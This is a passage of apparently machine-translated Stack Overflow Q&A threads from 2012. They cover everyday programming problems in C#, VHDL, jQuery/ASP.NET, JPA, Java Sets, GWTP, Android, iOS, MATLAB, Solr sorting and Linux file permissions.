GetFormattedValue 的第二个参数是 - 根据[文档](http://msdn.microsoft.com/en-us/library/system.windows.forms.datagridviewcell.getformattedvalue.aspx "文档")-*单元格父行的索引。*

在某些情况下，当我的函数被调用时，this 与 this.RowIndex 不同，后者再次 *获取单元格父行的索引。*

有谁知道这种奇怪的行为何时会发生以及如何治疗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:20:53.663

没关系。事实证明，“共享行”总是将 -1 作为 RowIndex 返回（列标题也是如此，这会造成不必要的混乱）。这可能就是为什么这个函数首先有一个 rowIndex 参数。

如果您对“共享行”感兴趣，[这是一个有用的链接。](http://msdn.microsoft.com/en-us/library/ha5xt0d9.aspx)

# vhdl - 用于科学计算的 VHDL

> ID：13360663
> 
> 赞同：-2
> 
> 时间：2012-11-13T12:21:06.700
> 
> 标签：vhdl, fpga, numerical-methods, scientific-computing

我想知道人们是否在科学计算中使用 VHDL/FPGA。

我正在考虑的一个示例场景是：

1.  构造一个任意精度的浮点加法器
2.  配置 FPGA 板，然后添加这些数字

因此，我一直在寻找 VHDL/FPGA 已用于科学计算的参考资料（示例代码）。

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T15:15:04.187

有几家供应商使用 FPGA 构建异构计算系统。我怀疑您会找到此类系统的完整源代码。

[SRC 计算](http://www.srccomp.com/products/highdensitymapstation.asp)

[传送电脑](http://www.conveycomputer.com/solutions/research/)

[米特里奥尼](http://www.mitrionics.com/?page=the_company)。其他系统的经销商。

[诺沃-G](http://www.chrec.org/ngforum/)。一个学术项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-02T19:30:45.307

研究射电天文学。对于 VLA 和 ALMA 等阵列，大规模并行相关器是最重要的部分。这些通常使用 FPGA，但可以使用定制设计的芯片以更高的成本实现极致性能。

一些细读： [https](https://science.nrao.edu/facilities/cdl/digital-signal-processing) ://science.nrao.edu/facilities/cdl/digital-signal-processing http://web.njit.edu/~gary/728/Lecture8.html

# javascript - 在 aspx 输入字段上/中插入文本和设置焦点？

> ID：13360665
> 
> 赞同：1
> 
> 时间：2012-11-13T12:21:13.100
> 
> 标签：javascript, jquery, asp.net, vb.net

我在 aspx 站点上执行 javascript 函数时遇到问题，该函数应该在 TextBox（多行）内容的开头插入一个字符串，并将光标设置在插入的字符串的中间。它根本不会在我这边被调用。

ASPX 代码：

```
 <head runat="server">
    <title>Unbenannte Seite</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
    <script type="text/javascript">
        function setCaretPosition(elemId, caretPos) {
            var elem = document.getElementById(elemId);

            if(elem != null) {
                if(elem.createTextRange) {
                    var range = elem.createTextRange();
                    range.move('character', caretPos);
                    range.select();
                }
                else {
                    if(elem.selectionStart) {
                        elem.focus();
                        elem.setSelectionRange(caretPos, caretPos);
                    }
                    else
                        elem.focus();
                }
            }
        }

        $("#<%=Button1.ClientID %>").click(function(e){
            e.preventDefault();
            var d = new Date();
            var curr_date = d.getDate();
            var curr_month = d.getMonth() + 1;
            var curr_year = d.getFullYear();
            var curr_hour = d.getHours();
            var curr_minute = d.getMinutes();
            var name = "Name";
            var wert = curr_date + "." + curr_month + "." + curr_year + " / " + curr_hour + ":" + curr_minute + " / " + name + "\n" + "----------------------------------------" + "\n";
            var len = wert.length();
            wert = wert + "\n" + "----------------------------------------" + "\n" + "\n";
            var input = $("#<%=tbVZusatz.ClientID %>");
            input.val(wert + input.val());
            input.val(input.val());
            setCaretPosition("<%=tbVZusatz.ClientID %>",len);
        });

    </script>
</head>
<body>
    <form id="form1" runat="server">
    <div>
        <asp:TextBox ID="tbVZusatz" runat="server" TextMode="MultiLine" Height="500px" Width="300px"></asp:TextBox>
        <br />
        <br />
        <asp:Button ID="Button1" runat="server" Text="Stempel" />
    </div>
    </form>
</body> 
```

插入的字符串应如下所示：

```
13.11.2012 / 13:08 / LightMonk
----------------------------------------
(Position of the Cursor here!)
---------------------------------------- 
```

我用于此的来源：

[http://jsfiddle.net/VP9zT/1/](http://jsfiddle.net/VP9zT/1/)

[在 html 文本框中设置键盘插入符号位置](https://stackoverflow.com/questions/512528/set-cursor-position-in-html-textbox)

更正的Javascript：

```
<script type="text/javascript">
    $(document).ready(function(){
        $("#<%=Button1.ClientID %>").click(function(e){
            e.preventDefault();
            var d = new Date();
            var curr_date = d.getDate();
            var curr_month = d.getMonth() + 1;
            var curr_year = d.getFullYear();
            var curr_hour = d.getHours();
            var curr_minute = d.getMinutes();
            var name = "Name";
            var wert = curr_date + "." + curr_month + "." + curr_year + " / " + curr_hour + ":" + curr_minute + " / " + name + "\n" + "----------------------------------------" + "\n";
            var len = wert.length;
            wert = wert + "\n" + "----------------------------------------" + "\n" + "\n";
            var input = $("#<%=tbVZusatz.ClientID %>");
            input.val(wert + input.val());
            input.val(input.val());
            setCaretPosition("<%=tbVZusatz.ClientID %>",len);
        });
    });

    function setCaretPosition(elemId, caretPos) {
        var elem = document.getElementById(elemId);

        if(elem != null) {
            if(elem.createTextRange) {
                var range = elem.createTextRange();
                range.move('character', caretPos);
                range.select();
            }
            else {
                if(elem.selectionStart) {
                    elem.focus();
                    elem.setSelectionRange(caretPos, caretPos);
                }
                else
                    elem.focus();
            }
        }
    }

</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T13:37:54.770

首先，您的代码应如下所示，在 document.ready() 上注册处理程序（我删除了 asp.net 标记） [http://jsfiddle.net/rMmwq/](http://jsfiddle.net/rMmwq/)

另请注意

```
 var len = wert.length; 
```

代替

```
 var len = wert.length(); 
```

# java - @Temporal 类型的 JPA 最佳实践

> ID：13360667
> 
> 赞同：2
> 
> 时间：2012-11-13T12:21:22.023
> 
> 标签：java, jakarta-ee, jpa

正如我们所知，Java 日期/时间类型是可变的。因此，如果我们想避免副作用，我们应该封装它们。

我正在寻找一种允许我在 JPA 2.0 中使用这些数据类型并同时实现封装目标的方法。

在我的实践中，我经常使用像这段代码这样的模式：

```
// imports are omitted 

@Entity
@Access(AccessType.PROPERTY)
public class MyEntity {
    private Integer id;

    @Access(AccessType.FIELD)
    private Calendar createdAt;

    public MyEntity() {
        createdAt = Calendar.getInstance();
    }

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    @Transient
    public Date getCreatedAt() {
        return createdAt.getTime();
    }

    public void setCreatedAt(Date createdAt) {
        this.createdAt.setTime(createdAt);
    }

} 
```

有没有更好的方法来做到这一点？

提前致谢。祝你今天过得愉快。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:12:32.773

日期可变是我们都必须忍受的设计怪癖。我们已经学会了忍受它，假装 Date 是不可变的并且从不操纵它（而且 Sun 通过在那里拍一些弃用使它更容易）。

当您保护代码免受自己和可信赖的同事的侵害时，编写防御性代码是没有好处的。我希望没有人打算故意做错事！

# java - 如何有效地比较 Sets？

> ID：13360675
> 
> 赞同：4
> 
> 时间：2012-11-13T12:21:58.307
> 
> 标签：java, set, comparable

给定两个集合：如何在 Java 中有效地比较它们？

*   (a) 将它们保留为`List`s，对它们进行排序并比较它们。( `Comparable`)
*   (b) 将它们保持为`Set`s 并比较`hashCode`Set 的？

**背景：**

需要进行许多比较 集合很小（通常每组 < 5 个元素）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-13T12:27:38.667

比较两组的正确方法是[使用`equals`方法](http://docs.oracle.com/javase/7/docs/api/java/util/Set.html#equals%28java.lang.Object%29)。除非您证明这是导致性能问题的代码的一部分（我对此表示怀疑），否则我不会担心性能。考虑到你的集合（5 个元素）的大小，这将非常快（可能是亚毫秒）。

> 将它们保存为列表，对它们进行排序和比较。（可比）

肯定会更慢，因为您需要复制元素，对它们进行排序并进行比较。

> 将它们保持为集合并比较集合的哈希码？

如果 2 个集合相等（具有相同的内容），它们将具有相同的哈希码。倒数不正确：具有不同内容的 2 个集合可能具有相同的哈希码。另请注意，`HashSet`例如，哈希码是通过迭代所有元素来计算的，因此它不是自由操作。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-13T12:27:29.873

[平等](http://docs.oracle.com/javase/6/docs/api/java/util/AbstractSet.html#equals%28java.lang.Object%29)有什么问题 ？文档指出，如果两者大小相同，则返回 true，如果`containsAll()`返回 true，对我来说听起来很有效。

在任何情况下，您都不应该*比较*哈希码来测试是否相等，两个不同的对象可能具有相同的哈希码。

*更新：*如评论中所述（以及 assylias 的回答），哈希码可以用作相等测试逻辑的一部分（不同的哈希码意味着不同的对象 - 但不是相反）。我上面的评论意味着单独的哈希码（通常）是不够的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:50:14.120

假设您要比较是否`set1` 具有*完全相同的*元素`set2`。

`set1.equals(set2)`并`set2.equals(set1)`确保两者*完全相同*。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T12:50:18.523

如果你有两个`HashSet`s，比较它们`Set.equals`将是 O(n)，因为只需要迭代一个集合，而另一个将由 来检查`contains`，这本身就是 O(1)。

请注意，对于像您这样小的集合，O(n) 和 O(n ² ) 之间的差异可以忽略不计，因此即使是最简单的方法也会产生良好的性能。

# events - GWTP：事件发送一次但接收（处理程序）两次

> ID：13360685
> 
> 赞同：0
> 
> 时间：2012-11-13T12:22:34.100
> 
> 标签：events, gwt, gwt-platform, gwtp

在 GWTP 上，我`UpdateDiagramBoxEvent`使用下面的代码发送一个，但处理程序执行了两次。换句话说，我可以看到`sendUpdateDiagramBoxEvent()`只执行了一次，但收到了两次。我的代码上的许多其他事件也发生了同样的情况。关于什么是错误的任何想法，以及如何避免这种行为？谢谢。

**接收事件**

```
UpdateDiagramBoxHandler updateDiagramBoxHandler = new UpdateDiagramBoxHandler() {
  @Override
  public void onUpdateDiagramBox(UpdateDiagramBoxEvent event) {
    doSomething();
  }
}; 
```

**发送事件**

```
EventUtil.sendUpdateDiagramBoxEvent(CellTableManager.this.eventBus, 
  BasicConstants.EventSubscriptors.VIEW, 0, 
  BasicConstants.EditableTableFields.DIAGRAMTYPE,                                           
  ClientState.getCurrentDiagramType().name());

public static void sendUpdateDiagramBoxEvent(final EventBus eventBus, 
    final BasicConstants.EventSubscriptors recipient, 
    final int index, final BasicConstants.EditableTableFields field, 
    final String value){

    Scheduler.get().scheduleDeferred(new ScheduledCommand() {    
        @Override
    public void execute() {
      UpdateDiagramBoxEvent updateDiagramBoxEvent = 
        new UpdateDiagramBoxEvent(transactionNumber, recipient, 
            field.toString(), value, index);
        eventBus.fireEvent(updateDiagramBoxEvent);
        }                               
    });
  } 
```

**注册事件处理程序（来自 MyProjectPresenter.java）**

```
@Inject PlaceManager placeManager;
@Override
protected void onBind() {
   [...]                      
       registerHandler(getEventBus().addHandler(UpdateDiagramBoxEvent.getType(),
       updateDiagramBoxHandler));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:28:46.810

这通常意味着您只需注册您的事件处理程序两次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:30:17.167

这是 GWTP，如果是，您如何注册您的事件/处理程序？我似乎记得有一个陷阱，您可以使用其中一个`@ProxyEvent` *或* `addRegisteredHandler()`两个，但不能同时使用，否则您将收到两次事件。

希望有帮助。

干杯，

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2022-01-13T00:16:36.700

或者有问题的 bean 可能不是单例的。

# android - 单击按钮时如何将当前数组数据传递给其他意图或活动？

> ID：13360691
> 
> 赞同：-1
> 
> 时间：2012-11-13T12:22:57.243
> 
> 标签：android, arrays, onclicklistener

在给定的代码中，将当前数组数据传递给另一个活动的简单方法是什么？我想将 jsonData.getString("date") 和 jsonData.getString("start_time") 传递给另一个活动。

```
 JSONObject jsonData;
    TableRow row1 = new TableRow(this);

    for (int i = 0; i < beaconsArray.length(); i++) 
     {
           jsonData =   beaconsArray.getJSONObject(i);
           row1     =   new TableRow(this);

           TextView textview    =   new TextView(this);
           textview.setText(jsonData.getString("date"));
           textview.setTextColor(Color.BLACK);
           textview.setWidth(165);
           row1.addView(textview);

           textview=    new TextView(this);
           textview.setText(jsonData.getString("start_time"));
           textview.setTextColor(Color.BLACK);
           textview.setWidth(90);
           row1.addView(textview); 

           ImageView iv = new ImageView(this);
           iv.setImageResource(R.drawable.view_btn);
           iv.setOnClickListener(ViewDetail_of_Beacon);
           row1.addView(iv);
     }

     public OnClickListener ViewDetail_of_Beacon = new OnClickListener() {

        public void onClick(View v) {

                // Here i need current array data ??

            }
        }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:36:53.920

你为什么不使用列表视图？而不是一张桌子

在列表视图中，您可以轻松设置自定义 onclicklistner，它使您可以访问行数据

onclicklistner 示例：

```
listView.setOnItemClickListener(new OnItemClickListener() {
    @Override
    public void onItemClick(AdapterView<?> arg0, View view, int arg2,long itemID) {
        String fromDate = ((TextView)view.findViewById(R.id.fromDate)).getText().toString();
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:27:44.503

如果您想将 2 个字符串传递给另一个活动。

```
use intent.putExtra(tag,data); 
```

如果要传递对象数组，请在另一个使用单例模式的类中设置静态变量，并通过 getter 方法获取变量。

# objective-c - 故事板视图控制器中的透明背景

> ID：13360692
> 
> 赞同：2
> 
> 时间：2012-11-13T12:23:03.703
> 
> 标签：objective-c, ios, uiviewcontroller, storyboard, uialertview

我正在制作一个登录屏幕。我有以下故事板。 ![在此处输入图像描述](../Images/2fc7d5b7c4c49289df537293d5382a5a.png)

我在代码中所做的是。如果设备上存储了用户名和密码。比 passViewController 弹出。否则会弹出登录视图控制器。这工作正常。

我遇到的问题是 LoginViewController 和 PassViewController 应该有一个透明的背景。我知道如何使用单个 xib 文件执行此操作，但我想在我的故事板中执行此操作，以便我可以使用从 Login 和 Passviewcontroller 到 nextController 的 segues。目前我正在代码中执行此操作。

```
 UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil];
        UIViewController *vc = [storyboard instantiateViewControllerWithIdentifier:@"LoginViewController"];
        vc.view.backgroundColor = [UIColor clearColor];
        self.modalPresentationStyle = UIModalPresentationCurrentContext;
        [self presentModalViewController:vc animated:YES]; 
```

任何人都可以帮助我如何实现这一目标。

亲切的问候。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:43:34.743

如果我的理解是正确的，你只需要点击你的视图控制器的视图，例如你的 LoginViewController 的视图。这是控制器视图层次结构中的第一个视图。然后在屏幕右侧的属性检查器中，您可以将视图的背景颜色设置为“清除颜色”。那是你要找的吗？

# arrays - Matlab中如何将单元格复制到数组中

> ID：13360694
> 
> 赞同：-1
> 
> 时间：2012-11-13T12:23:09.683
> 
> 标签：arrays, matlab, cell, cell-array

好吧，让我详细解释一下我的问题

下图显示了我要复制数据的矩阵

![在此处输入图像描述](../Images/7fd8aa04bf4ea1ae961b2f1e2c22d4ab.png)

好吧，现在我想做的是你可以看到 1x4 单元格，我想将它作为数组复制到另一个变量，例如

```
 input_values=ones(1,4);%init
    input_values=input_matrix_training(1); 
```

所以在上面我试图将第 1 行的单元格数组中的元素复制到 input_values 数组中。但是，如果我按照上面的方式做，我会得到这个而不是数组包含的值。泰

![在此处输入图像描述](../Images/14066cf710e612fb52a521dcaaa498e8.png)

而不是上面它应该像

![在此处输入图像描述](../Images/ce86e0e85421bb0ac506d448259e8446.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:25:04.183

其他值是一个单元格，因此最好使用`{}`而不是引用`()`。此外，有时需要将它们包装成`[]`，具体取决于格式。再加上你不需要初始化 input_values，你应该做的是：

```
input_values=[input_matrix_training{1}]; 
```

或者你可以只使用 cell2mat

```
input_values=cell2mat(input_values(1)); 
```

# jquery - jQuery.load() 包装器来管理多个请求和“.loading” CSS 类

> ID：13360698
> 
> 赞同：0
> 
> 时间：2012-11-13T12:23:18.577
> 
> 标签：jquery, css, ajax

我`.load()`广泛用于 AJAX 内容。这很棒，但如果它做得更多，我会喜欢它：

1.  如果为了响应用户操作，我`.load()`对同一个 div 进行了多次调用，我最终可能会在 div 中得到错误的数据。当较早的请求的回调速度比较晚的请求慢时，就会发生这种情况。我需要一些东西来拒绝过时的回调

2.  如果`.load()`向目标添加一个 CSS 类会很好......并在回调完成后删除该类。

是否有提供此类功能的 jQuery 库或插件？或者它可以在这么少的行中完成，它不值得一个插件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:47:46.290

创建自己的插件来防止多个并发请求非常容易。这是一个简单的插件，它拦截 AJAX 调用，保留未完成请求的列表并在有新请求时中止它们：

```
$.fn.preventConcurrentAjax = function() {
    return this.ajaxSend(function(e, jqXHR, settings) {
        $.each($(this).data("pca-pending") || [], function() { this.abort(); });
        $(this).data("pca-pending", [jqXHR]);
    });
}; 
```

您可以轻松地扩展它，以便在请求*完成*而不是排队时取消仍然未完成的早期请求；为此，您还需要为每个请求存储一个时间戳。

您还可以使用 jQuery[`.ajaxStart()`](http://api.jquery.com/ajaxStart/)并轻松[`.ajaxStop()`](http://api.jquery.com/ajaxStop/)地自动切换“加载”类，例如：

```
$.fn.loadingOnAjax = function() {
    var $self = $(this);
    return this.ajaxStart(function() { $self.addClass("loading"); })
               .ajaxStop(function() { $self.removeClass("loading"); });
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:27:25.933

无需插件即可轻松完成：

```
function ajaxLoad() {
    $('#result')
        .addClass('isLoading')
        .load('ajax/test.html', function() {
            $('#result').removeClass('isLoading');
        });
} 
```

要停止多个 ajax 调用，请检查：

```
if( ! $('#result').hasClass('isLoading') ) {
    ajaxLoad();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T13:03:45.117

您可以使用 xhr 对象取消以前的请求。

```
( function load( ) {
    var xhr;

    return function( url ) {

        // abort previous request
        if( xhr && xhr.readystate != 4 ) { xhr.abort(); }

        xhr = $.get(url, function (data) {
            $('#id').html(data);
        });
    };
}());

load( url ); 
```

# ios - 另一个类的iOS调用方法

> ID：13360705
> 
> 赞同：0
> 
> 时间：2012-11-13T12:23:50.527
> 
> 标签：ios, class, methods

我在这个网站上发现了类似的问题，但没有以清晰和基本的方式解决问题。

我有我的 ReadViewController.h 和 ReadViewController.m 文件以及我的 ChooseViewController.h 和 ChooseViewController.m 文件。

他们都需要访问当前位于 ReadViewController.m 文件中的 getProperties 方法。

```
- (void) getProperties {
    NSLog(@"Start getProperties");
//SOME CODE
    NSLog(@"End getProperties");
} 
```

现在理想情况下，这将在名为 GeneralModel.m 的第三个文件中

请给我一个基本示例，说明控制器文件中需要哪些代码才能调用此方法。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-13T12:32:31.347

如果这个方法要在 Application 的很多地方使用，那么在这种情况下你应该把它当作全局方法，并尝试把这个方法放在单独的类中，可能是类的类型`NSObject`。

```
 @interface Utility :NSobject

  - (void) getProperties
  @end

 @implementation Utility

 - (void) getProperties {
    NSLog(@"Start getProperties");
   //SOME CODE
    NSLog(@"End getProperties");
 }
 @end 
```

在这里，每当您需要这些方法时，您只需要创建`Utility`Class 的 Object 就可以在需要的任何地方轻松访问它。like

只是以`ReadViewController`这种方式制作对象和访问

```
 Utility * obje = [Utility  alloc]init];

  [obje getProperties  ]; 
```

还有一件事，如果您只是谈论应用程序架构，假设您遵循`MVC`这种情况，您应该保留您的`model(NSObject Type)Class`进行一些数据库调用，请求调用服务器。`View`将Classes 代码 Like分开保存`UIView`，只将 Code 放在`Controller class`需要控制 App Logic 的地方。

[这是解释`MVC`架构的链接。](http://developer.apple.com/library/ios/#documentation/general/conceptual/DevPedia-CocoaCore/MVC.html)

我希望它清楚你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T10:19:48.277

我实施的解决方案如下所示。不过，我会接受 iOS-Developer 的回答，因为它让我走上了正轨。

```
//*********************
//ReadViewController.h
#import <UIKit/UIKit.h>
#import "GeneralModel.h"

@interface ReadViewController : UIViewController {
    GeneralModel *generalModel;
}

@end
//*********************

//*********************
//ReadViewController.m
#import "ReadViewController.h"

@interface ReadViewController ()

@end

@implementation ReadViewController

NSArray *allProperties;

- (void) getProperties {
    generalModel = [[GeneralModel alloc] init];
    allProperties = [generalModel getProperties];
    NSLog(@"ALLPROPERTIES: %@", allProperties);
    [generalModel release];
}
//**********************

//**********************
//GeneralModel.h
#import <Foundation/Foundation.h>
#import "sqlite3.h"

@interface GeneralModel : NSObject {

}
-(NSArray *) getProperties;
@end
//**********************

//**********************
//GeneralModel.m
#import "GeneralModel.h"

@implementation GeneralModel

- (NSArray *) getProperties {
    NSLog(@"Start getProperties");
    NSArray *someProperties;
//Some nice code goes here for getting a lot of nice properties from somewhere else.
    return someProperties
    NSLog(@"End getProperties");
}
//*********************** 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-04-09T10:41:38.000

如果此方法要在 Application 中的许多地方使用，那么在这种情况下，您应该将其视为全局方法，并尝试将此方法放在单独的类中，可能是 NSObject 类的类型。

```
@interface Utility :NSobject
- (void) getProperties
@end

@implementation Utility

- (void) getProperties {
    NSLog(@"Start getProperties");
    //SOME CODE
    NSLog(@"End getProperties");
}
@end 
```

在这里，每当您需要该方法时，您只需要创建实用程序类的对象就可以在任何需要的地方轻松访问它。like

在 ReadViewController 中只需以这种方式创建对象和访问

```
Utility * obje = [Utility  alloc]init];
[obje getProperties  ]; 
```

# solr - SOLR 4.0 字母排序问题

> ID：13360706
> 
> 赞同：9
> 
> 时间：2012-11-13T12:23:52.393
> 
> 标签：solr

我很难理解我的 SOLR 地址数据库存在的问题。

我从示例文件构建了这个。我基本上是在使用修改后的模式运行示例配置。

*架构.xml*：

```
<field name="id" type="string" indexed="true" stored="true" required="true" multiValued="false" />
<field name="_version_" type="long" indexed="true" stored="true" required="false" multiValued="false" />

<field name="givenname_s" type="text_de" indexed="true" stored="true" required="true" multiValued="false" />
<field name="middleinitial_s" type="text_de" indexed="false" stored="true" required="false" multiValued="false" />
<field name="surname_s" type="text_de" indexed="true" stored="true" required="true" multiValued="false" />
<field name="gender_s" type="string" indexed="true" stored="true" required="true" multiValued="false" />
<field name="pictureuri_s" type="string" indexed="false" stored="true" required="false" multiValued="false" />
<field name="function_s" type="text_de" indexed="true" stored="true" required="false" multiValued="false" />
<field name="organizationalunit_s" type="text_general" indexed="true" stored="true" required="false" multiValued="false" />
<field name="organizationalunitdescription_s" type="text_de" indexed="false" stored="true" required="false" multiValued="false" />
<field name="company_s" type="text_de" indexed="true" stored="true" required="false" multiValued="false" />
<field name="street_s" type="text_de" indexed="true" stored="true" required="false" multiValued="false" />
<field name="streetnumber_s" type="int" indexed="true" stored="true" required="false" multiValued="false" />
<field name="postcode_s" type="int" indexed="true" stored="true" required="false" multiValued="false" />
<field name="city_s" type="text_de" indexed="true" stored="true" required="false" multiValued="false" />
<field name="building_s" type="text_de" indexed="true" stored="true" required="false" multiValued="false" />
<field name="roomnumber_s" type="int" indexed="true" stored="true" required="false" multiValued="false" />
<field name="country_s" type="text_en" indexed="true" stored="true" required="true" multiValued="false" />
<field name="countrycode_s" type="string" indexed="true" stored="true" required="true" multiValued="false" />
<field name="emailaddress_s" type="string" indexed="true" stored="true" required="false" multiValued="false" />
<field name="phone1_s" type="string" indexed="true" stored="true" required="false" multiValued="false" />
<field name="phone2_s" type="string" indexed="true" stored="true" required="false" multiValued="false" />
<field name="mobile_s" type="string" indexed="true" stored="true" required="false" multiValued="false" />
<field name="fax_s" type="string" indexed="true" stored="true" required="false" multiValued="false" /> 
```

我通过将大约 20.000 个随机测试数据集（如下所示）推送到*post.jar*来填充数据库：

```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<add>
    <doc>
        <field name="id">1352498443_1</field>
        <field name="givenname_s">Aynur</field>
        <field name="middleinitial_s"/>
        <field name="surname_s">Lehnen</field>
        <field name="gender_s">F</field>
        <field name="pictureuri_s">dummy_assets/female.jpg</field>
        <field name="function_s">Zugschaffner/in</field>
        <field name="organizationalunit_s">P 07</field>
        <field name="organizationalunitdescription_s">Lorem Ipsum sadipscing voluptua ipsum invidunt dolor et dolore invidunt sed consetetur accusam dolore Lorem tempor.</field>
        <field name="company_s">Lorem Lagna Epsum Emet</field>
        <field name="street_s">Erlenweg</field>
        <field name="streetnumber_s">82</field>
        <field name="postcode_s">76297</field>
        <field name="city_s">Lübeck</field>
        <field name="building_s"/>
        <field name="roomnumber_s">242</field>
        <field name="country_s">GERMANY</field>
        <field name="countrycode_s">DE</field>
        <field name="emailaddress_s">aynur.lehnen@lorem-lagna-epsum-emet.de</field>
        <field name="phone1_s">0392984823</field>
        <field name="phone2_s">0124111417</field>
        <field name="mobile_s">0325117132</field>
        <field name="fax_s">0171459177</field>
    </doc>
</add> 
```

但是，在检索数据时，我似乎遇到了按字母排序的问题。考虑以下查询：

```
{
    "responseHeader": {
        "status": 0,
            "QTime": 5,
            "params": {
            "sort": "surname_s asc",
                "fl": "surname_s",
                "indent": "true",
                "wt": "json",
                "q": "city_s:berlin"
        }
    },
        "response": {
        "numFound": 1094,
        "start": 0,
        "docs": [{
            "surname_s": "Weil"
        }, {
            "surname_s": "Abel"
        }, {
            "surname_s": "Adam"
        }, {
            "surname_s": "Ade"
        }, {
            "surname_s": "Adrian"
        }, {
            "surname_s": "Aigner"
        }, {
            "surname_s": "Aigner"
        }, {
            "surname_s": "Alber"
        }, {
            "surname_s": "Alber"
        }, {
            "surname_s": "Albers"
        }]
    }
} 
```

为什么“Weil”在第一个位置，而其余数据似乎排序正确？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-13T13:03:10.500

我相信在`text_de`字段类型中应用的一些附加分析器是导致这种排序行为的原因。以我的经验，为了在对字符串进行排序时获得最佳结果，请使用`alphaOlySort`下面显示的示例 schema.xml 附带的 fieldType。

```
<fieldType name="alphaOnlySort" class="solr.TextField" sortMissingLast="true" omitNorms="true">
  <analyzer>
    <!-- KeywordTokenizer does no actual tokenizing, so the entire
         input string is preserved as a single token
      -->
    <tokenizer class="solr.KeywordTokenizerFactory"/>
    <!-- The LowerCase TokenFilter does what you expect, which can be
         when you want your sorting to be case insensitive
      -->
    <filter class="solr.LowerCaseFilterFactory" />
    <!-- The TrimFilter removes any leading or trailing whitespace -->
    <filter class="solr.TrimFilterFactory" />
    <!-- The PatternReplaceFilter gives you the flexibility to use
         Java Regular expression to replace any sequence of characters
         matching a pattern with an arbitrary replacement string, 
         which may include back references to portions of the original
         string matched by the pattern.

         See the Java Regular Expression documentation for more
         information on pattern and replacement string syntax.

         http://java.sun.com/j2se/1.6.0/docs/api/java/util/regex/package-summary.html
      -->
    <filter class="solr.PatternReplaceFilterFactory"
            pattern="([^a-z])" replacement="" replace="all"
    />
  </analyzer>
</fieldType> 
```

我建议创建一个新字段，然后`surname_s`通过 copyField 复制值，如下所示：

```
 <field name="surname_s_sort" type="alphaOnlySort" indexed="true" stored="false" required="false" multiValued="false" />

 <copyField source="surname_s" dest="surname_s_sort"/> 
```

**注意：**`surname_s_sort`不需要将值存储在字段中，因此也不需要存储`stored="false"`属性，除非您希望将其显示给用户。

然后你可以改变你的查询来排序`surname_s_sort`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-14T04:02:30.943

排序在多值和标记化字段上效果不佳。

[文档](http://wiki.apache.org/solr/CommonQueryParameters#sort)-
可以对文档的“分数”或任何 multiValued="false" indexed="true" 字段进行排序，前提是该字段未标记化（即：没有分析器）或使用仅生成单个 Term（即：使用 KeywordTokenizer）

使用字符串作为字段类型并将标题字段复制到新字段中。

```
<field name="surname_s_sort" type="string" indexed="true" stored="false"/>

<copyField source="surname_s" dest="surname_s_sort" /> 
```

正如@Paige 回答的那样，您可以使用不标记字段的关键字标记器、小写过滤器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-05-01T08:31:35.963

我有类似的问题，我尝试了 alphaOnlySort。这在某些方面有效，但是当字段包含 -、/ 空格等值时，它开始弄乱排序结果。

所以结果是这样的

1.  / abc
2.  啊
3.  / abc2

所以我最终使用了小写的字段类型。它已经在那里，所以我认为它是默认类型。我确实使用了复制字段构造，所以我的最终配置是：

```
<schema>
    <fieldType name="lowercase" class="solr.TextField" positionIncrementGap="100">
      <analyzer>
        <tokenizer class="solr.KeywordTokenizerFactory"/>
        <filter class="solr.LowerCaseFilterFactory" />
      </analyzer>
    </fieldType>
    <fields>
       <field name="job_name_sort" type="lowercase" indexed="true" stored="false" required="false"/>
    </fields>
    <copyField source="job_name" dest="job_name_sort"/>
</schema> 
```

# linux - 访问原始文件权限（Linux）

> ID：13360708
> 
> 赞同：0
> 
> 时间：2012-11-13T12:24:03.653
> 
> 标签：linux, file-permissions

据我所知（如果我错了，请纠正我），Linux 将有关每个文件所有者和权限的信息存储在文件开头的几个字节中。

我知道有很多方法可以获取有关文件的信息（使用 shell 命令和 GUI），但我真正想知道的是是否有办法以原始形式访问（查看）这些权限。

也许问这个问题的一个更正确的方法是是否有办法查看完整的文件内容（我已经看到文件的二进制输出使用`hexdump -C test.txt`，但它仍然不包含那些），包括所有者/权限数据。

我想这些信息只能以原始形式在深核代码中访问，但我真的很好奇是否可以以不同的方式访问它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T12:28:13.183

*>>据我所知（如果我错了，请纠正我），Linux 将有关每个文件所有者和权限的信息存储在文件开头的几个字节中。*

**不！**

